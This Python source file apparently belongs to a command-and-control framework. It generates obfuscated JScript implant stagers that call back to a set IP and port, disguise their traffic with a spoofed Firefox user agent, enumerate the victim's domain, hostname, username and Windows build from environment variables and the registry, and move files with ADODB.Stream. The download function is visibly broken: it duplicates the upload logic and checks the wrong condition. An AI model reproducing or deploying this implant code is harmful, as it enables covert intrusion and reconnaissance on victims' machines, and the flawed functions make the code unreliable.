import urllib.parse as parse

from connect import util

class Stager():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.variables = {}
        self.functions = {}
        self.setup_variables()
        self.setup_functions()

    def setup_variables(self):
        pass

    def setup_functions(self):
        pass

class JScriptStager(Stager):

    format = 'jscript'

    def __init__(self, ip, port):
        super().__init__(ip, port)

    def setup_variables(self):
        self.variables['errors'] = (util.generate_str(), 0)
        self.variables['file-system-object'] = (util.generate_str(), 'new ActiveXObject("Scripting.FileSystemObject")')
        self.variables['host'] = (util.generate_str(), self.ip)
        self.variables['port'] = (util.generate_str(), self.port)
        self.variables['post-req'] = (util.generate_str(), '')
        self.variables['sleep'] = (util.generate_str(), 3000)
        self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
        self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
        self.variables['content-type'] = (util.generate_str(), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        self.variables['x-frame-options'] = (util.generate_str(), 'SAMEORIGIN')
        self.variables['wscript.shell'] = (util.generate_str(), 'new ActiveXObject("WScript.Shell");')
        self.variables['winhttp.winhttprequest'] = (util.generate_str(), 'new ActiveXObject("WinHttp.WinHttpRequest.5.1");')

        wscript = self.variables['wscript.shell'][0]
        self.variables['domain'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERDOMAIN%");')
        self.variables['hostname'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%COMPUTERNAME%");')
        self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%");')
        self.variables['product-name'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName");')
        self.variables['build-number'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber");')

    def setup_functions(self):
        self.functions['domain'] = util.Function('domain', 'Enumerates the current domain from environment variables', 'function domain(){{return {0}}}'.format(self.variables['domain'][1]))
        self.functions['hostname'] = util.Function('hostname', 'Enumerates the current hostname from environment variables', 'function hostname(){{return {0}}}'.format(self.variables['hostname'][1]))
        self.functions['os'] = util.Function('os', 'Enumerates the current operating system product name and build number', 'function os(){{var productname = {0}; var buildnumber = {1}; return productname + " Build " + buildnumber;}}'.format(self.variables['product-name'][1], self.variables['build-number'][1]))
        self.functions['sleep'] = util.Function('sleep', 'Change the delay between checkins (e.g., sleep 5000) is a delay of 5 seconds', 'function sleep(tmp){{{0} = tmp;}}'.format(self.variables['sleep'][0]))
        self.functions['upload'] = util.Function('upload','Upload a file to the remote system (e.g., upload file:local_filename, "remote_path")',
        ('''function upload(data, path) {{'''
            '''if ({2}.FileExists(path) == true){{'''
                '''return 'File already exists.';'''
            '''}}'''
            '''var stream = new ActiveXObject("ADODB.Stream");'''
            '''stream.Open();'''
            '''stream.Type = 1;'''
            '''stream.Write(data);'''
            '''stream.Position = 0;'''
            '''stream.SaveToFile(path, 2);'''
            '''stream.Close();'''
            '''return 'Successfully uploaded ' + path + '.';'''
        '''}}''').format(self.variables['post-req'][0], ''' '"filename":"' + filename + '"}' ''', self.variables['file-system-object'][0]))
        self.functions['download'] = util.Function('download','Download a file to the remote system (e.g., download "remote_path")',
        ('''function download(path) {{'''
            '''if ({2}.FileExists(path) == false){{'''
                '''return 'File already exists.';'''
            '''}}'''
            '''var stream = new ActiveXObject("ADODB.Stream");'''
            '''stream.Open();'''
            '''stream.Type = 1;'''
            '''stream.Write(data);'''
            '''stream.Position = 0;'''
            '''stream.SaveToFile(path, 2);'''
            '''stream.Close();'''
            '''return 'Successfully uploaded ' + path + '.';'''
        '''}}''').format(self.variables['post-req'][0], ''' '"filename":"' + filename + '"}' ''', self.variables['file-system-object'][0]))
        self.functions['whoami'] = util.Function('whoami', 'Enumerates the current user from environment variables', 'function whoami(){{return {0}}}'.format(self.variables['username'][1]))
